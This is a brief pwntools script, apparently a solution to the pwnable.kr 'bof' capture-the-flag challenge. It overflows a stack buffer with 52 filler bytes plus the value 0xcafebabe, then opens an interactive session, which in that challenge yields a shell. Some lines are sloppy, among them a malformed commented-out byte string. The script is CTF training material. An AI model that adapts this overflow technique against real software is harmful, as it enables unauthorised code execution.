### http://pwnable.kr/play.php ### (bof)

from pwn import *

s = process("./bof_boy")
#s = remote("pwnable.kr", 9000)

payload = "A"*52
payload += p32(0xcafebabe)
#payload += {'\xbe\ba\fe\ca'}
s.sendline(payload)
print "%s", payload
s.interactive()
